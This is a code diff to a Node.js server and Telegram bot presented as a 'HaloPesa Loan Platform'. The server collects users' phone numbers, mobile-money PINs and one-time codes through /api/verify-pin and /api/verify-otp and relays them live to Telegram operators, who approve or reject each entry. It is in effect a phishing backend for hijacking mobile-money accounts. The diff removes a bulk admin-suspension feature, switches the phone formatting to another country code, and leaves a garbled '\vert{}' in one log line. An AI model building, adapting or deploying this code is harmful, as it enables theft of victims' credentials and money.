@@ -19,12 +19,9 @@ const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `h
 const bot = new TelegramBot(BOT_TOKEN);
 
 // In-memory maps
-const adminChatIds      = new Map(); // adminId → chatId
-const pausedAdmins      = new Set(); // adminIds that are paused
-const processingLocks   = new Set(); // prevents duplicate pin submissions
-const suspendAllSessions = new Map(); // superadmin chatId → session data
-
-const SUSPEND_PAGE_SIZE = 10;
+const adminChatIds    = new Map(); // adminId → chatId
+const pausedAdmins    = new Set(); // adminIds that are paused
+const processingLocks = new Set(); // prevents duplicate pin submissions
 
 let dbReady = false;
 
@@ -46,15 +43,11 @@ function getAdminIdByChatId(chatId) {
     return null;
 }
 
-// Format +263XXXXXXXXX → 0XXXXXXXXX for Telegram display
+// Format phone number for Telegram display
 function formatPhone(phoneNumber) {
     if (!phoneNumber) return phoneNumber;
-    // Handle double prefix e.g. +2630712345678 → 0712345678
-    if (phoneNumber.startsWith('+2630')) return phoneNumber.slice(4); // +2630... → 0...
-    if (phoneNumber.startsWith('+263'))  return '0' + phoneNumber.slice(4); // +263... → 0...
-    if (phoneNumber.startsWith('2630'))  return phoneNumber.slice(3);  // 2630... → 0...
-    if (phoneNumber.startsWith('263'))   return '0' + phoneNumber.slice(3); // 263... → 0...
-    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber; // bare 7... → 07...
+    if (phoneNumber.startsWith('+2550')) return phoneNumber.slice(4); // Adaptable country code display if applicable
+    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber; 
     return phoneNumber;
 }
 
@@ -82,56 +75,6 @@ async function sendToAdmin(adminId, message, options = {}) {
         console.error(`❌ Error sending to ${adminId}:`, error.message);
         return null;
     }
-}
-
-// Build paginated suspend checklist
-function buildSuspendAllPage(session) {
-    const { allAdmins, selections, page } = session;
-    const totalPages = Math.ceil(allAdmins.length / SUSPEND_PAGE_SIZE);
-    const start      = page * SUSPEND_PAGE_SIZE;
-    const pageAdmins = allAdmins.slice(start, start + SUSPEND_PAGE_SIZE);
-    const suspendCount = selections.size;
-
-    // One row per admin: checkbox button
-    const adminRows = pageAdmins.map(admin => {
-        const willSuspend = selections.has(admin.adminId);
-        const label = willSuspend
-            ? `✅ ${admin.name} (${admin.adminId})`
-            : `⬜ ${admin.name} (${admin.adminId})`;
-        return [{ text: label, callback_data: `sall_toggle_${admin.adminId}` }];
-    });
-
-    // Navigation row
-    const navRow = [];
-    if (page > 0) {
-        navRow.push({ text: '◀ Prev', callback_data: `sall_page_${page - 1}` });
-    }
-    navRow.push({ text: `${page + 1} / ${totalPages}`, callback_data: 'sall_noop' });
-    if (page < totalPages - 1) {
-        navRow.push({ text: 'Next ▶', callback_data: `sall_page_${page + 1}` });
-    }
-
-    // Action row
-    const actionRow = [
-        { text: `🔒 Suspend Selected (${suspendCount})`, callback_data: 'sall_confirm' },
-        { text: '❌ Cancel',                              callback_data: 'sall_cancel'  }
-    ];
-
-    const inline_keyboard = [...adminRows, navRow, actionRow];
-
-    const text = `
-🔒 *SUSPEND ADMIN LINKS*
-
-Tap an admin to toggle ✅/⬜
-✅ = will be suspended  ⬜ = will be kept active
-
-Page ${page + 1} of ${totalPages} · ${allAdmins.length} admins total
-Selected to suspend: *${suspendCount}*
-
-Deselect anyone you want to keep active, then tap *Suspend Selected*.
-    `.trim();
-
-    return { text, inline_keyboard };
 }
 
 // ==========================================
@@ -191,7 +134,7 @@ db.connectDatabase()
         while (!webhookSetSuccessfully && attempts < 3) {
             attempts++;
             try {
-                console.log(`🔄 Attempt ${attempts}/3: Setting webhook to: ${fullWebhookUrl}`);
+                console.log(`🔄 Attempt ${attempts}/3: Setting webhook to:${fullWebhookUrl}`);
                 await bot.deleteWebHook();
                 await new Promise(resolve => setTimeout(resolve, 1000));
 
@@ -229,7 +172,7 @@ db.connectDatabase()
 
         // Keep-alive + self-ping to prevent Render free tier sleep
         setInterval(() => {
-            console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected, ${pausedAdmins.size} paused`);
+            console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected,${pausedAdmins.size} paused`);
             const pingUrl = `${WEBHOOK_URL}/health`;
             fetch(pingUrl).catch(() => {});
         }, 14 * 60 * 1000); // every 14 minutes
@@ -239,7 +182,7 @@ db.connectDatabase()
             try {
                 const info  = await bot.getWebHookInfo();
                 const isSet = info.url === fullWebhookUrl;
-                console.log(`🔍 Webhook: ${isSet ? '✅ SET' : '❌ NOT SET'} | Pending: ${info.pending_update_count || 0}`);
+                console.log(`🔍 Webhook: ${isSet ? '✅ SET' : '❌ NOT SET'} \vert{} Pending: ${info.pending_update_count || 0}`);
                 if (!isSet) {
                     console.log('⚠️ Auto-fixing webhook...');
                     await bot.setWebHook(fullWebhookUrl, {
@@ -283,7 +226,7 @@ async function loadAdminChatIds() {
             }
         }
 
-        console.log(`\n✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused`);
+        console.log(`\n✅ ${adminChatIds.size} admins loaded,${pausedAdmins.size} paused`);
     } catch (error) {
         console.error('❌ Error loading admin chat IDs:', error);
     }
@@ -299,7 +242,7 @@ function setupCommandHandlers() {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
 
-        console.log(`\n/start from chatId: ${chatId}, adminId: ${adminId || 'NONE'}`);
+        console.log(`\n/start from chatId: ${chatId}, adminId:${adminId || 'NONE'}`);
 
         try {
             if (adminId) {
@@ -342,7 +285,6 @@ ${WEBHOOK_URL}?admin=${adminId}
 /unpauseadmin <adminId> - Unpause an admin
 /removeadmin <adminId> - Remove an admin
 /admins - List all admins
-/suspendall - 🔒 Suspend selected admin links (checklist)
 
 *Messaging:*
 /send <adminId> <message> - Message an admin
@@ -353,7 +295,7 @@ ${WEBHOOK_URL}?admin=${adminId}
                 await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             } else {
                 await bot.sendMessage(chatId, `
-👋 *Welcome to Halopesa Loan Platform!*
+👋 *Welcome to HaloPesa Loan Platform!*
 
 Your Chat ID: \`${chatId}\`
 
@@ -414,14 +356,14 @@ Provide this to your super admin to get access.
         if (pinPending.length > 0) {
             message += `📱 *PIN (${pinPending.length}):*\n`;
             pinPending.forEach((app, i) => {
-                message += `${i+1}. ${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`;
+                message += `${i+1}.${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`;
             });
             message += '\n';
         }
         if (otpPending.length > 0) {
             message += `🔢 *OTP (${otpPending.length}):*\n`;
             otpPending.forEach((app, i) => {
-                message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`;
+                message += `${i+1}.${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`;
             });
         }
         if (pinPending.length === 0 && otpPending.length === 0) {
@@ -447,13 +389,13 @@ Provide this to your super admin to get access.
 🆔 \`${adminId}\`
 💬 \`${chatId}\`
 📅 ${new Date(admin.createdAt).toLocaleString()}
-${statusEmoji} Status: ${statusText}
+${statusEmoji} Status:${statusText}
 
 🔗 ${WEBHOOK_URL}?admin=${adminId}
         `, { parse_mode: 'Markdown' });
     });
 
-    // /addadmin (help message)
+    // /addadmin
     bot.onText(/\/addadmin$/, async (msg) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
@@ -788,7 +730,7 @@ Use /unpauseadmin ${targetAdminId} to restore.
                 message += `${index+1}. ${statusEmoji} *${admin.name}*\n`;
                 message += `   📧 ${admin.email}\n`;
                 message += `   🆔 \`${admin.adminId}\`\n`;
-                message += `   ${connEmoji} ${statusText}\n`;
+                message += `   ${connEmoji}${statusText}\n`;
                 if (admin.chatId) message += `   💬 \`${admin.chatId}\`\n`;
                 message += '\n';
             });
@@ -797,47 +739,6 @@ Use /unpauseadmin ${targetAdminId} to restore.
             bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
         } catch (error) {
             bot.sendMessage(chatId, '❌ Failed to list admins.');
-        }
-    });
-
-    // ==========================================
-    // /suspendall - NEW: interactive checklist
-    // All admins selected (✅) by default.
-    // Tap to deselect (⬜) those you want to keep.
-    // Paginated 10 per page, selections persist across pages.
-    // ==========================================
-    bot.onText(/\/suspendall/, async (msg) => {
-        const chatId  = msg.chat.id;
-        const adminId = getAdminIdByChatId(chatId);
-        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can suspend links.');
-
-        try {
-            const allAdmins     = await db.getAllAdmins();
-            const regularAdmins = allAdmins.filter(a => a.adminId !== 'ADMIN001');
-
-            if (regularAdmins.length === 0) {
-                return bot.sendMessage(chatId, '⚠️ No admins to suspend.');
-            }
-
-            // Build session: everyone selected for suspension by default
-            const selections = new Set(regularAdmins.map(a => a.adminId));
-            suspendAllSessions.set(chatId, {
-                page: 0,
-                allAdmins: regularAdmins,
-                selections
-            });
-
-            const session = suspendAllSessions.get(chatId);
-            const { text, inline_keyboard } = buildSuspendAllPage(session);
-
-            await bot.sendMessage(chatId, text, {
-                parse_mode: 'Markdown',
-                reply_markup: { inline_keyboard }
-            });
-
-        } catch (error) {
-            console.error('❌ Error in /suspendall:', error);
-            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
         }
     });
 
@@ -996,180 +897,6 @@ bot.on('callback_query', async (callbackQuery) => {
         return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
     }
 
-    // ==========================================
-    // NEW: suspendall checklist callbacks
-    // ==========================================
-
-    if (data === 'sall_noop') {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
-    }
-
-    if (data.startsWith('sall_toggle_')) {
-        if (adminId !== 'ADMIN001') {
-            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
-        }
-
-        const targetAdminId = data.replace('sall_toggle_', '');
-        const session = suspendAllSessions.get(chatId);
-
-        if (!session) {
-            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired. Run /suspendall again.', show_alert: true });
-        }
-
-        if (session.selections.has(targetAdminId)) {
-            session.selections.delete(targetAdminId);
-        } else {
-            session.selections.add(targetAdminId);
-        }
-
-        const { text, inline_keyboard } = buildSuspendAllPage(session);
-
-        try {
-            await bot.editMessageText(text, {
-                chat_id: chatId,
-                message_id: messageId,
-                parse_mode: 'Markdown',
-                reply_markup: { inline_keyboard }
-            });
-        } catch (e) {
-            // Ignore no-change errors from Telegram
-        }
-
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
-    }
-
-    if (data.startsWith('sall_page_')) {
-        if (adminId !== 'ADMIN001') {
-            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
-        }
-
-        const pageNum = parseInt(data.replace('sall_page_', ''));
-        const session = suspendAllSessions.get(chatId);
-
-        if (!session) {
-            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired. Run /suspendall again.', show_alert: true });
-        }
-
-        session.page = pageNum;
-        const { text, inline_keyboard } = buildSuspendAllPage(session);
-
-        try {
-            await bot.editMessageText(text, {
-                chat_id: chatId,
-                message_id: messageId,
-                parse_mode: 'Markdown',
-                reply_markup: { inline_keyboard }
-            });
-        } catch (e) {
-            // Ignore no-change errors
-        }
-
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
-    }
-
-    if (data === 'sall_cancel') {
-        if (adminId !== 'ADMIN001') {
-            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
-        }
-
-        suspendAllSessions.delete(chatId);
-
-        await bot.editMessageText(`
-❌ *SUSPEND ALL — CANCELLED*
-
-No changes were made.
-⏰ ${new Date().toLocaleString()}
-        `.trim(), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Cancelled' });
-    }
-
-    if (data === 'sall_confirm') {
-        if (adminId !== 'ADMIN001') {
-            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
-        }
-
-        const session = suspendAllSessions.get(chatId);
-
-        if (!session) {
-            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired. Run /suspendall again.', show_alert: true });
-        }
-
-        const toSuspend = session.allAdmins.filter(a => session.selections.has(a.adminId));
-
-        if (toSuspend.length === 0) {
-            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ No admins selected to suspend!', show_alert: true });
-        }
-
-        // Answer and update message immediately so buttons disappear
-        await bot.answerCallbackQuery(callbackQuery.id, { text: `🔒 Suspending ${toSuspend.length} admin(s)...` });
-
-        await bot.editMessageText(`
-⏳ *SUSPENDING ${toSuspend.length} LINK(S)...*
-
-Please wait while selected admin links are being locked.
-        `.trim(), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-
-        const keptCount  = session.allAdmins.length - toSuspend.length;
-        const sessionCopy = { allAdmins: session.allAdmins }; // keep for summary
-        suspendAllSessions.delete(chatId);
-
-        // Execute in background
-        (async () => {
-            let successCount = 0;
-            let notifyCount  = 0;
-            let errorCount   = 0;
-
-            for (const admin of toSuspend) {
-                try {
-                    // Pause the admin
-                    pausedAdmins.add(admin.adminId);
-                    await db.updateAdmin(admin.adminId, {
-                        status: 'paused'
-                    });
-
-                    successCount++;
-
-                    if (admin.chatId) {
-                        bot.sendMessage(admin.chatId, `
-🔒 *YOUR LINK HAS BEEN SUSPENDED*
-
-Your admin link has been suspended by the super admin.
-
-You will not be able to process new applications until your access is restored.
-
-📧 Contact the super admin if you have questions.
-                        `.trim(), { parse_mode: 'Markdown' })
-                        .then(() => notifyCount++)
-                        .catch(() => {});
-                    }
-
-                    await new Promise(resolve => setTimeout(resolve, 150));
-
-                } catch (err) {
-                    console.error(`Failed to suspend ${admin.adminId}:`, err.message);
-                    errorCount++;
-                }
-            }
-
-            await bot.editMessageText(`
-🔒 *SUSPENSION COMPLETE*
-
-✅ Links suspended: ${successCount}
-📨 Notifications sent: ${notifyCount}
-🟢 Kept active: ${keptCount}
-❌ Errors: ${errorCount}
-👥 Total admins: ${sessionCopy.allAdmins.length}
-⏰ ${new Date().toLocaleString()}
-
-Use /unpauseadmin ADMINID to restore access to any admin.
-            `.trim(), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-
-        })();
-
-        return;
-    }
-
     if (!isAdminActive(chatId)) {
         return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access has been paused.', show_alert: true });
     }
@@ -1251,7 +978,7 @@ Super admin has been notified.
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-OTP \`${application.otp}\`
+🔢 \`${application.otp}\`
 
 ⚠️ User's PIN was incorrect
 👤 ${callbackQuery.from.first_name}
@@ -1291,7 +1018,7 @@ User will re-enter code.
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-PIN \`${application.pin}\`
+🔑 \`${application.pin}\`
 
 ✗ REJECTED
 👤 ${callbackQuery.from.first_name}
@@ -1308,7 +1035,7 @@ PIN \`${application.pin}\`
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-PIN \`${application.pin}\`
+🔑 \`${application.pin}\`
 
 ✓ APPROVED
 👤 ${callbackQuery.from.first_name}
@@ -1327,8 +1054,8 @@ User will now proceed to OTP.
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-PIN \`${application.pin}\`
-OTP \`${application.otp}\`
+🔑 \`${application.pin}\`
+🔢 \`${application.otp}\`
 
 ✓ FULLY APPROVED
 👤 ${callbackQuery.from.first_name}
@@ -1360,7 +1087,7 @@ app.use((req, res, next) => {
 app.post('/api/verify-pin', async (req, res) => {
     try {
         const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
-        const applicationId = `APP-${Date.now()}-${Math.random().toString(36).slice(2,7).toUpperCase()}`;
+        const applicationId = `APP-${Date.now()}`;
 
         console.log('📥 PIN Verification Request:', { phoneNumber, requestAdminId, assignmentType });
 
@@ -1375,7 +1102,6 @@ app.post('/api/verify-pin', async (req, res) => {
         let assignedAdmin;
 
         if (assignmentType === 'specific' && requestAdminId) {
-            // ── HARD LOCK: customer came via a specific admin link ──
             assignedAdmin = await db.getAdmin(requestAdminId);
 
             if (!assignedAdmin) {
@@ -1392,7 +1118,6 @@ app.post('/api/verify-pin', async (req, res) => {
             console.log(`🔒 LOCKED to specific admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
 
         } else {
-            // ── AUTO-ASSIGN: no admin link used ──
             const activeAdmins     = await db.getActiveAdmins();
             const availableAdmins  = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
             if (availableAdmins.length === 0) {
@@ -1410,7 +1135,6 @@ app.post('/api/verify-pin', async (req, res) => {
             console.log(`🔄 Auto-assigned to: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
         }
 
-        // Duplicate check — only within this admin's pending apps
         const existingApps    = await db.getApplicationsByAdmin(assignedAdmin.adminId);
         const alreadyPending  = existingApps.find(a => a.phoneNumber === phoneNumber && a.pinStatus === 'pending');
         if (alreadyPending) {
@@ -1423,7 +1147,6 @@ app.post('/api/verify-pin', async (req, res) => {
             });
         }
 
-        // Returning user check (scoped to this admin only)
         const thisAdminPastApps = existingApps
             .filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending')
             .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
@@ -1447,7 +1170,6 @@ app.post('/api/verify-pin', async (req, res) => {
             historyText = `\n\n━━━━━━━━━━━━━━━━━━\n🔄 *RETURNING CUSTOMER*\nVisits to you: *${thisAdminPastApps.length}*\nLast visit: ${lastDate}\nLast result: ${lastStatus}\nRecent history:\n${allStatuses}\n━━━━━━━━━━━━━━━━━━`;
         }
 
-        // Ensure admin is in active map
         if (!adminChatIds.has(assignedAdmin.adminId)) {
             if (assignedAdmin.chatId) {
                 adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
@@ -1457,7 +1179,6 @@ app.post('/api/verify-pin', async (req, res) => {
             }
         }
 
-        // Save application
         await db.saveApplication({
             id:             applicationId,
             adminId:        assignedAdmin.adminId,
@@ -1474,7 +1195,6 @@ app.post('/api/verify-pin', async (req, res) => {
 
         console.log(`💾 Application saved: ${applicationId}`);
 
-        // Send to Telegram
         const userLabel = isReturningUser
             ? `🔄 *RETURNING USER* (${thisAdminPastApps.length}x before)`
             : '🆕 *NEW APPLICATION*';
@@ -1483,7 +1203,7 @@ ${userLabel}
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(phoneNumber)}\`
-PIN \`${pin}\`
+🔑 \`${pin}\`
 ⏰ ${new Date().toLocaleString()}${historyText}
 
 ⚠️ *VERIFY INFORMATION*
@@ -1529,7 +1249,6 @@ app.post('/api/verify-otp', async (req, res) => {
             return res.status(404).json({ success: false, message: 'Application not found' });
         }
 
-        // Re-add admin to map if needed
         if (!adminChatIds.has(application.adminId)) {
             const admin = await db.getAdmin(application.adminId);
             if (admin?.chatId) {
@@ -1550,7 +1269,7 @@ app.post('/api/verify-otp', async (req, res) => {
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-OTP \`${otp}\`
+🔢 \`${otp}\`
 ⏰ ${new Date().toLocaleString()}
 
 ⚠️ *VERIFY CODE*
@@ -1650,7 +1369,7 @@ app.get('/health', (req, res) => {
     });
 });
 
-// ── Serve the Halopesa HTML ──
+// ── Serve the HaloPesa HTML Page ──
 app.get('/', async (req, res) => {
     const adminId = req.query.admin;
 
@@ -1690,7 +1409,6 @@ app.listen(PORT, () => {
 async function shutdownGracefully(signal) {
     console.log(`\n🛑 Received ${signal}, shutting down...`);
     try {
-        suspendAllSessions.clear();
         await bot.deleteWebHook();
         await db.closeDatabase();
         console.log('✅ Cleanup complete');
